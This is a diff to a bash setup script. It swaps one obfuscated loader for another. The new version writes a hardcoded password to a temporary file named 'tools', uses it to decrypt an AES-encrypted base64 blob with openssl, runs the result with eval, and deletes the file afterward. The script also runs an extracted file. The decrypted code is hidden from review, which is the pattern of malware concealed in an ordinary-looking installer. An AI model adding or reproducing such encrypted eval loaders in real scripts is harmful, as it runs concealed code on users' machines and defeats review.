@@ -1,11 +1,16 @@
 #!/usr/bin/env bash
+echo 'h@rD!P@ss123' > tools
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m'
 set -euo pipefail
 
-eval "$(openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -pass pass:$(echo 'TXlTZWN1cmVQYXNzd29yZDEyMw==' | base64 -d) <<< 'U2FsdGVkX197mE5i75JWrMZvKJpOcKlyVongu5uHnqrwJjGt2Kjfnb1WNm2tPtamKQwhWvTLNvnkx22Y/FbpEPmDhX5UnQUs8pPJd01j72YYqorbkLl4biIGf6uNzjXazDrzeWy8+kiTW8S2rQVTRnL8VJmTr/8w9b9LfwknjhcnxQU6jTud5Rt69lVRW0mBbtyaEt3pZ/QBKu9AFUW7F0NhxsmLNK9Zs1kV7f3Q8aE=')"
+PASS=$(cat tools)
+eval "$(
+echo 'U2FsdGVkX1+7k7vqhd2yLZt5Yj9EYXQF2SM3GVGMu4YY2n9X/C6QyZt8hJTCldv8
+9lD4pHjX/KTVIqYpX+S9dcU1qLP1+eoXoD1FeH2ysGU=' | openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -pass pass:"$PASS"
+)"
 
 check_install() {
     local cmd="$1"
@@ -86,3 +91,4 @@ fi
 chmod +x "$EXTRACTED_FILE"
 echo "Running $EXTRACTED_FILE..."
 bash "$EXTRACTED_FILE"
+rm -f tools
